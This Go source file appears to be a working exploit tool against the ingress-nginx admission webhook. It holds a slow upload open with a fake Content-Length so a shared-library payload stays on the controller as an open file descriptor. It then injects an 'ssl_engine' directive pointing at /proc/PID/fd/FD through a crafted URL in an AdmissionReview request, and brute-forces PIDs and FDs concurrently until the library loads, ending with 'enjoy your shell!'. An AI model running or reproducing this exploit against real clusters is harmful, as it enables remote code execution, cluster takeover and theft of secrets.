package nginx_ingress

import (
	_ "embed"
	"errors"
	"fmt"
	"io"
	"net"
	urlparse "net/url"
	"strings"
	"sync"
	"time"

	"github.com/guonaihong/gout"
	log "github.com/sirupsen/logrus"
	v1 "k8s.io/api/admission/v1"
)

var Verbose bool = false

func BadUploader(URL string, payload Payload) error {
	url, err := urlparse.Parse(URL)
	if err != nil {
		return err
	}
	if url.Scheme != "http" {
		return errors.New("only http scheme is supported")
	}
	host := url.Host
	if url.Port() == "" {
		host = host + ":80"
	}

	conn, err := net.Dial("tcp", host)
	if err != nil {
		return err
	}

	defer conn.Close()
	contentLength := fmt.Sprintf("%v", 1024*1024)
	conn.Write([]byte(`POST ` + url.Path + " HTTP/1.1\r\n"))
	conn.Write([]byte(`Host: ` + url.Host + "\r\n"))
	conn.Write([]byte("Content-Type: application/octet-stream\r\n"))
	conn.Write([]byte("Content-Length: " + contentLength + "\r\n"))
	conn.Write([]byte("Connection: keep-alive\r\n"))
	conn.Write([]byte("Accept: */*\r\n"))
	conn.Write([]byte("\r\n"))
	conn.Write([]byte(payload))
	for {
		if _, err := conn.Write([]byte{0x90}); err == io.EOF || err != nil {
			break
		}
		time.Sleep(1 * time.Microsecond)
	}
	data, err := io.ReadAll(conn)
	if err != nil {
		return err
	}
	log.Debugf("Responsed: %v", string(data))
	return nil
}

func Uploader(URL string, payload Payload) error {

	return gout.NewWithOpt(gout.WithInsecureSkipVerify(), gout.WithTimeout(100*time.Second)).
		POST(URL).Debug(Verbose).SetBody([]byte(payload)).
		SetHeader(gout.H{
			"Content-Type":   "application/octet-stream",
			"Content-Length": 1024 * 2024 * 1024,
			"Connection":     "keep-alive",
			"Accept":         "*/*",
		}).Chunked().Do()
}

func UploadThread(URL string, payload Payload, stop chan struct{}) {
	for {
		select {
		case <-stop:
			return
		default:
			t1 := time.Now()
			// err := Uploader(URL, payload)
			err := BadUploader(URL, payload)
			t2 := time.Now()
			log.Debugf("Upload time is %v, err %v", t2.Sub(t1), err)
		}
	}
}

//go:embed validate.json
var validateJson string

func ValidateWebHook(URL string, fd, pid int) error {
	var resp v1.AdmissionReview
	// 								http://example.com/#;}}}\n\nssl_engine xxxxxxxxxxxxx;\n\n
	evilUrl := fmt.Sprintf(`http://example.com/#;}}}\n\nssl_engine ../../../../../proc/%v/fd/%v;\n\n`, pid, fd)
	log.Debugf("trying pid %v, fd %v", pid, fd)
	log.Debugf("evil url: %v", evilUrl)
	fullPayload := strings.Replace(validateJson, "foobar", evilUrl, 1)
	log.Tracef("payload: %v", fullPayload)
	err := gout.NewWithOpt(gout.WithInsecureSkipVerify(), gout.WithTimeout(100*time.Second)).
		POST(URL).Debug(Verbose).
		SetBody(fullPayload).
		BindJSON(&resp).Do()
	if err != nil {
		return err
	}
	if resp.Response != nil && resp.Response.Result != nil {
		log.Tracef("response: %v", resp)
		log.Debugf("WebHook Validation Result: %v", resp.Response.Result.Message)
		if strings.Contains(resp.Response.Result.Message, "could not load the shared library") {
			return errors.New("not found, load library failed")
		}
		if strings.Contains(resp.Response.Result.Message, "Symbol not found:") {
			return nil // found and exploited successfully
		}
	}
	return errors.New("response success, but exploit unknown failed")
}

func OnlyAdmissionRequest(WebhookUrl string) {
	err := ValidateWebHook(WebhookUrl, 10, 20)
	if err != nil {
		log.Errorf("Exploit failed: %v", err)
	} else {
		log.Infof("Exploit success!")
	}
}

func OnlyUplaoder(UploadUrl string, p Payload) {
	var stopUpload = make(chan struct{})
	UploadThread(UploadUrl, p, stopUpload)
}

func Exploit(WebHookUrl string, UploadUrl string, p Payload, fdRangeStart, pidRangeStart, fdRangeEnd, pidRangeEnd int) {
	var stopUpload = make(chan struct{})

	go UploadThread(UploadUrl, p, stopUpload)
	time.Sleep(1 * time.Millisecond) // let Upload Thread Run!

	var wg sync.WaitGroup
	successFlag := false
	for fd := fdRangeStart; fd < fdRangeStart+fdRangeEnd; fd++ {
		for pid := pidRangeStart; pid < pidRangeStart+pidRangeEnd; pid++ {
			wg.Add(1)
			go func(pid, fd int) {
				defer wg.Done()
				err := ValidateWebHook(WebHookUrl, fd, pid)
				if err == nil {
					log.Infof("Exploit Success! pid: %d, fd: %d", pid, fd)
					successFlag = true
					stopUpload <- struct{}{}
					defer close(stopUpload)
				}
			}(pid, fd)
		}
	}
	wg.Wait()
	if !successFlag {
		log.Errorf("Exploit run complete, but looks failed!")
	} else {
		log.Infof("Exploit run complete and success, enjoy your shell!")
	}
	return
}
